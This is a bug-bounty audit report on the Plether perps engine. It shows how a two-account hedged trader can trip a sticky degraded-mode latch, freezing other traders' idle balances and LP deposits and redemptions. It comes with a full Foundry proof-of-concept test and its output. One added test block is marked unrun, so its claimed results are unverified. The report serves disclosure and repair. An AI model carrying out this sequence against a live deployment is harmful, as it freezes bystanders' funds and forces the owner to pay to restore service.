# \#100079 [SC-High] A trader hedged across two accounts can latch degraded mode on demand in a pool whose collateral covers its worst-case liability, freezing other users' idle balances and LP settlement until the owner pays to clear it

**Submitted on Nov 16th 2026 at 07:40:39 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100079
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description


## Summary

After every close, the engine latches degraded mode if pool cash net of trader claims is below the larger side's maximum possible profit. A trader holding a long and a short on two accounts can force that condition by closing the winning leg after a modest price move. Cash leaves the pool, the worst-case figure does not fall, and the matching loss on the other leg is ignored even though it is fully backed by that leg's margin in the clearinghouse. Once latched, every account with an open position is blocked from withdrawing — including idle balance that backs nothing and is not pool liquidity — and all LP settlement and deposits stop. The latch never clears on its own: `clearDegradedMode` is owner-only, and while the attacker holds his leg it reverts until the owner injects cash through `recapitalizePool`.

## Description

### The check

`_enterDegradedModeIfInsolvent` (`CfdEngine.sol:1351-1369`) runs after each close and liquidation. It sets `degradedMode = true` when `E < L`, where:

- `E` is `pool.totalAssets()` minus `totalTraderClaimBalanceAssets` (`CfdEngine.sol:865-871`).
- `L` is the larger of the two sides' `maxProfitAssets` (`CfdEngine.sol:1044-1050`).

### Why one party can trigger it

Opens are admitted while `E >= L + B`, with `B` only 25 bps of `L` (`settlementBufferBps = 25`, `CfdEngine.sol:153`). The headroom is therefore that buffer plus any spare LP capital.

1. The attacker opens a long on account A and a slightly smaller short on account B, sized so `L` sits near the admission bound.
2. The price moves in favour of the smaller side.
3. The attacker closes that side. The pool pays the profit, so `E` falls by that amount. `L` is set by the other side and does not change.
4. `E < L`, and the latch fires.

Making both legs nearly equal makes the attack direction-agnostic: whichever leg wins is closed.

### Why the pool is not short of collateral

The remaining leg carries an unrealized loss of about the same size as the profit just paid, and it is covered by margin held in the clearinghouse. The check counts only physical pool cash, so it treats a covered receivable as a shortfall. In the PoC, `E` after the close is 953,912 against `L` of 980,000, while `E` plus the long leg's margin-backed loss is 1,002,912.

### What the latch blocks

- New opens are rejected at commit (`OrderLiquidationBatchLogic.sol:328-329`) and at execution (`CfdEnginePlanLib.sol:318-319`).
- Any account with an open position cannot withdraw, even idle balance (`CfdEngineSettlementSidecar.sol:274-275`).
- Every LP epoch settlement reverts (`HousePool.sol:832`, `:1864-1870`), so no redemption is funded and no queued deposit is activated.
- New LP deposit requests are refused (`HousePool.sol:1143`, `TrancheVault.sol:1319`, `:1594-1596`).

### Why recovery is deadlocked

- `clearDegradedMode` is owner-only and reverts with `CfdEngine__StillInsolvent` while `E < L` (`CfdEngine.sol:658-667`).
- Nothing in the engine ever sets `degradedMode` back to false. The latch persists after the attacker closes his remaining leg until the owner acts.
- LP capital that would restore `E` can neither be requested nor settled.
- The covered loss reaches the pool only when the attacker closes or is liquidated, and he controls the first.
- That leaves `recapitalizePool`, which pulls from the owner's wallet (`CfdEngine.sol:631-653`).

### Why this is not a liquidity shortage

The frozen funds are not pool liquidity. The bystander's idle balance sits in `MarginClearinghouse` as his own money; the pool holds 953,912 in cash; his withdrawal of 1 USDC reverts on `CfdEngine__DegradedMode`, a state flag, not on any cash check. A liquidity shortage lifts when cash arrives and costs no one principal. This state does neither: deposits that would bring cash are refused, the flag outlives the condition that set it, and the only exit transfers the owner's money to LPs permanently.

### Documentation gap

`WHITEPAPER.md:1322-1340` and `SECURITY.md:340` present the latch as containment for a shortfall revealed by a terminal transition. They do not say one party can trigger it at will, that it fires while the losing side's margin covers the gap, that LP deposits are blocked, or that it does not clear when the condition does.

### Recommended fix

- Decide degraded mode on what is collectible, for example by counting the losing side's margin-backed loss alongside pool cash.
- Keep the worst-case check `E >= L + B` only for admitting new positions.
- Keep free-balance withdrawals and LP deposits working while degraded.
- Let anyone clear the latch once cash covers liability plus buffer.

## Impact

**Rubric: Griefing (Medium).** Secondary: Smart contract unable to operate due to lack of token funds (Medium); Temporary freezing of funds for at least 1 hour (Medium).

- **Idle collateral of every account with an open position is frozen.** The bystander in the PoC holds ~49,000 USDC of unpledged balance and cannot withdraw 1 USDC. This money is not pool liquidity and is not at risk; it is blocked by the flag alone.
- **The freeze does not end on its own.** `degradedMode` is only ever set true. After the attacker closes his remaining leg and `E ≥ L` again, the latch is still set until the owner calls `clearDegradedMode`. While he holds the leg, that call reverts until the owner recapitalizes. LP epochs are hourly, so a single latch holds at least one settlement; in practice it lasts until the owner funds and executes the recapitalization.
- **The owner pays to exit.** In the PoC the owner had to inject 26,088 USDC into a pool whose cash plus collectible loss already exceeded its worst-case liability. That cash becomes LP equity and is not recovered. The attacker can repeat the sequence after each clear at the cost of fees and carry on a hedged book, so each round costs him low thousands and the owner tens of thousands.
- **LP settlement stops in both directions.** Queued redemptions are not funded; queued deposits are not activated; new deposit requests are refused. The capital that could restore `E` is turned away at the door.
- **New trading halts.** Any open is rejected `DEGRADED_MODE` at commit and execution. Closes and liquidations still work.
- **Low trigger threshold, low cost.** Headroom in the PoC was 22,000 USDC against a 970,000 leg, so a ~2.3% move suffices; the test uses 5%. The legs offset, so the attacker's exposure is fees, carry and the price risk of the leg he keeps.
- **No fund theft.** Value does not move to the attacker. Damage falls on other traders, LPs and the owner.



## Proof of Concept

## Proof of Concept


Save as `packages/perps/test/perps/regression/DegradedModeGriefPoC.t.sol` and run from `packages/perps`:

```
forge test --match-contract DegradedModeGriefPoC -vv
```

The test uses `BasePerpTest` defaults (1,000,000 USDC junior deposit plus seeds, 40% skew cap, 25 bps buffer). Nothing is overridden.

1. An honest LP queues a deposit and a redemption, and a bystander opens a small short with about 49,000 USDC idle.
2. The attacker opens a 980,000 long on one account and a 970,000 short on another, at 1.00.
3. The price moves to 1.05 and the attacker closes the short.
4. The test asserts the latch, the unchanged `L`, and that the long's margin covers its loss.
5. It asserts each blocked action.
6. **(Added.)** In a snapshot branch, the attacker closes his remaining long; the test asserts the latch is still set and the bystander is still frozen, then reverts the branch.
7. It asserts that `clearDegradedMode` reverts until the owner recapitalizes.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";

import {CfdEnginePlanTypes} from "@plether/perps/CfdEnginePlanTypes.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

/// Default BasePerpTest configuration: 1,000,000 USDC junior deposit + seeds, default risk params
/// (maxSkewRatio 40%, settlementBufferBps 25). Nothing is overridden.
contract DegradedModeGriefPoC is BasePerpTest {

    address attackerLong = address(0xA11CE1); // attacker account #1
    address attackerShort = address(0xA11CE2); // attacker account #2
    address bystander = address(0xB0B); // honest trader with a small position and idle balance
    address lp = address(0x11D); // honest LP

    uint256 constant ENTRY = 1e8;
    uint256 constant MOVED = 1.05e8; // +5%

    function _E() internal view returns (uint256) {
        uint256 p = pool.totalAssets();
        uint256 c = engine.totalTraderClaimBalanceAssets();
        return p > c ? p - c : 0;
    }

    function test_PoC_TwoAccountTraderLatchesDegradedModeInSolventPool() public {
        // ---------- setup: honest users ----------
        // An LP deposit and an LP redemption are queued before the attack (both honest, both pending).
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        settlementToken.mint(lp, 500_000e6);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), 500_000e6);
        uint256 depositId = juniorVault.requestDeposit(250_000e6, lp, lp);
        vm.stopPrank();
        uint256 redeemId = juniorVault.requestRedeem(juniorVault.estimateWithdrawShares(1000e6), address(this), address(this));

        _fundTrader(bystander, 50_000e6);
        _open(bystander, CfdTypes.Side.SHORT, 10_000e18, 1000e6, ENTRY);

        // ---------- attacker builds a hedged book up to the admission bound ----------
        _fundTrader(attackerLong, 200_000e6);
        _fundTrader(attackerShort, 200_000e6);
        // stepped so each open respects the 40% skew cap
        _open(attackerShort, CfdTypes.Side.SHORT, 390_000e18, 40_000e6, ENTRY);
        _open(attackerLong, CfdTypes.Side.LONG, 780_000e18, 80_000e6, ENTRY);
        _open(attackerShort, CfdTypes.Side.SHORT, 580_000e18, 60_000e6, ENTRY);
        _open(attackerLong, CfdTypes.Side.LONG, 200_000e18, 20_000e6, ENTRY);
        // book: LONG 980k (attacker), SHORT 970k (attacker) + 10k (bystander)

        uint256 lBefore = _maxLiability();
        uint256 eBefore = _E();
        assertFalse(engine.degradedMode(), "healthy before the attack");
        assertGe(eBefore, lBefore + (lBefore * 25) / 10_000, "book was admitted under E >= L + B");
        emit log_named_decimal_uint("E before          ", eBefore, 6);
        emit log_named_decimal_uint("L before          ", lBefore, 6);

        // ---------- market moves 5%, attacker closes the winning leg ----------
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _close(attackerShort, CfdTypes.Side.SHORT, 970_000e18, MOVED);

        uint256 eAfter = _E();
        uint256 lAfter = _maxLiability();
        emit log_named_decimal_uint("E after close     ", eAfter, 6);
        emit log_named_decimal_uint("L after close     ", lAfter, 6);
        assertTrue(engine.degradedMode(), "one profitable close latched degraded mode");
        assertEq(lAfter, lBefore, "worst-case liability did not fall");
        assertLt(eAfter, lAfter, "E < L");

        // ---------- the pool is not short: the gap is covered by the losing leg's own margin ----------
        (uint256 longSize, uint256 longMargin,,,,,) = engine.positions(attackerLong);
        uint256 longLoss = (longSize * (MOVED - ENTRY)) / 1e20; // 18-dec size * 8-dec price -> 6-dec assets
        emit log_named_decimal_uint("long leg loss     ", longLoss, 6);
        emit log_named_decimal_uint("long leg margin   ", longMargin, 6);
        assertGe(longMargin, longLoss, "loss fully backed by posted margin");
        assertGe(eAfter + longLoss, lAfter, "cash + collectible loss covers worst-case liability");

        // ---------- consequence 1: new opens are rejected ----------
        address newTrader = address(0xCAFE);
        _fundTrader(newTrader, 10_000e6);
        uint256 depth = pool.totalAssets();
        vm.expectRevert(
            abi.encodeWithSelector(
                ICfdEngineTypes.CfdEngine__TypedOrderFailure.selector,
                CfdEnginePlanTypes.ExecutionFailurePolicyCategory.ProtocolStateInvalidated,
                uint8(CfdEnginePlanTypes.OpenRevertCode.DEGRADED_MODE),
                false
            )
        );
        vm.prank(address(router));
        engine.processOrderTyped(
            CfdTypes.Order({
                account: newTrader,
                sizeDelta: 1000e18,
                marginDelta: 100e6,
                targetPrice: MOVED,
                commitTime: uint64(vm.getBlockTimestamp()),
                commitBlock: uint64(block.number),
                orderId: 0,
                side: CfdTypes.Side.SHORT,
                isClose: false
            }),
            MOVED,
            depth,
            uint64(vm.getBlockTimestamp())
        );

        // ---------- consequence 2: bystander cannot withdraw even 1 USDC of idle balance ----------
        assertGt(clearinghouse.balanceAssets(bystander), 40_000e6, "bystander has ~49k idle");
        vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
        vm.prank(bystander);
        clearinghouse.withdrawMargin(1e6);

        // ---------- consequence 3: LP side is frozen in both directions ----------
        // (a) no epoch can settle: the queued redemption is not funded and the queued deposit is not activated
        uint256 epochStart = pool.lpEpochStart(redeemId);
        if (vm.getBlockTimestamp() < epochStart) {
            vm.warp(epochStart);
        }
        _ensureLaterOracleTime();
        vm.prank(address(router));
        engine.updateMarkPrice(MOVED, uint64(vm.getBlockTimestamp()));
        uint64 markTime = engine.lastMarkTime();
        vm.expectRevert(IHousePool.HousePool__DegradedMode.selector);
        vm.prank(address(router));
        pool.settleLpEpoch(MOVED, markTime);
        assertEq(juniorVault.claimableDepositRequest(depositId, lp), 0, "queued LP deposit never activates");
        // (b) fresh LP capital that would restore cash is refused at the door
        assertEq(juniorVault.maxRequestDeposit(lp), 0, "deposits disabled while degraded");
        vm.expectRevert();
        vm.prank(lp);
        juniorVault.requestDeposit(250_000e6, lp, lp);

        // ---------- ADDED (unrun): consequence 4: the latch outlives the condition that set it ----------
        // Even if the attacker unwinds and the covered loss flows into the pool, nothing clears the flag.
        {
            uint256 snap = vm.snapshotState();
            _close(attackerLong, CfdTypes.Side.LONG, 980_000e18, MOVED);
            emit log_named_decimal_uint("E after attacker exits", _E(), 6);
            emit log_named_decimal_uint("L after attacker exits", _maxLiability(), 6);
            assertGe(_E(), _maxLiability(), "condition is gone: E >= L again");
            assertTrue(engine.degradedMode(), "latch still set: nothing in the engine clears it");
            vm.expectRevert(ICfdEngineTypes.CfdEngine__DegradedMode.selector);
            vm.prank(bystander);
            clearinghouse.withdrawMargin(1e6);        // bystander still frozen, pool now flush with cash
            vm.expectRevert();                        // still owner-only
            vm.prank(bystander);
            engine.clearDegradedMode();
            vm.revertToState(snap);
        }

        // ---------- consequence 5: recovery is deadlocked without owner cash ----------
        vm.expectRevert(ICfdEngineTypes.CfdEngine__StillInsolvent.selector);
        engine.clearDegradedMode();

        vm.expectRevert(); // Ownable: clearDegradedMode is owner-only
        vm.prank(bystander);
        engine.clearDegradedMode();

        // Only the owner's own money ends it.
        uint256 gap = _maxLiability() - _E();
        emit log_named_decimal_uint("owner cash needed ", gap, 6);
        settlementToken.mint(address(this), gap);
        settlementToken.approve(address(engine), gap);
        engine.recapitalizePool(gap);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "cleared only after owner recapitalization");
    }

}
```

Output (from the submitted run; the added block's two log lines are not yet included — rerun before filing):

```
[PASS] test_PoC_TwoAccountTraderLatchesDegradedModeInSolventPool() (gas: 5019500)
  E before          : 1002000.000000
  L before          : 980000.000000
  E after close     : 953911.769721
  L after close     : 980000.000000
  long leg loss     : 49000.000000
  long leg margin   : 98628.000000
  owner cash needed : 26088.230279
```

After the close, `E` (953,912) is below `L` (980,000), yet `E` plus the long's margin-backed loss (49,000) is 1,002,912.


